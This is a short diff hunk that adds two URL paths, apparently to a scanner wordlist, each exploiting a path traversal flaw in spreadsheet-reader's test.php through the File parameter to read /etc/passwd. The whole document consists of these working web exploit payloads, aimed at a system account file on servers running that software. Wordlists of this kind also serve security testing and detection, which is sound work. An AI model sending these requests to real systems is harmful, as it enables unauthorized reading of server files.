@@ -1,0 +1,2 @@
+/spreadsheet-reader/test.php?File=../../../../../../../../../../../etc/passwd
+/nuovo/spreadsheet-reader/test.php?File=../../../../../../../../../../../etc/passwd
